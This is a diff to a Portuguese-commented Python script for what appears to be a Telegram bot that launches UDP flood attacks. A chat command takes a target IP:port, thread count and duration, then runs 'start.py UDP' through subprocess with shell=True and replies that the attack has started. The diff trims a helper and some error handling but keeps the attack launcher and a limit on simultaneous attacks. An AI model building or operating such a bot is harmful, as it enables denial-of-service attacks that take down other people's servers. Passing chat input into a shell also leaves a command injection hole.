@@ -17,23 +17,6 @@ def validar_ip_porta(ip_porta):
     match = re.match(padrao, ip_porta)
     return match is not None
 
-# Função para executar o comando do ataque
-def executar_comando(ip_porta, threads, tempo):
-    comando_terminal = f"python3 start.py UDP {ip_porta} {threads} {tempo}"
-    try:
-        processo = subprocess.Popen(
-            comando_terminal, 
-            shell=True, 
-            stdout=subprocess.PIPE, 
-            stderr=subprocess.PIPE
-        )
-        processos[ip_porta] = processo
-        time.sleep(int(tempo))  # Aguarda o tempo do ataque
-        processo.terminate()  # Termina o processo após o tempo especificado
-        del processos[ip_porta]  # Remove o processo da lista
-    except Exception as e:
-        print(f"Erro ao executar o comando: {str(e)}")
-
 # Função para gerenciar o limite de ataques simultâneos
 def manage_attacks():
     if len(processos) >= MAX_ATTACKS:
@@ -95,11 +78,10 @@ def crash_server(message):
 
     # Executar o comando no terminal
     comando_terminal = f"python3 start.py UDP {ip_porta} {threads} {tempo}"
-    try:
-        subprocess.Popen(comando_terminal, shell=True)
-        bot.send_message(message.chat.id, f"Ataque iniciado para {ip_porta} com {threads} threads por {tempo} segundos.")
-    except Exception as e:
-        bot.send_message(message.chat.id, f"Erro ao iniciar o ataque: {str(e)}")
+    subprocess.Popen(comando_terminal, shell=True)
+
+    # Responder ao usuário confirmando que o ataque foi iniciado
+    bot.send_message(message.chat.id, f"Ataque iniciado para {ip_porta} com {threads} threads por {tempo} segundos.")
 
 # Comando /meuid
 @bot.message_handler(commands=['meuid'])
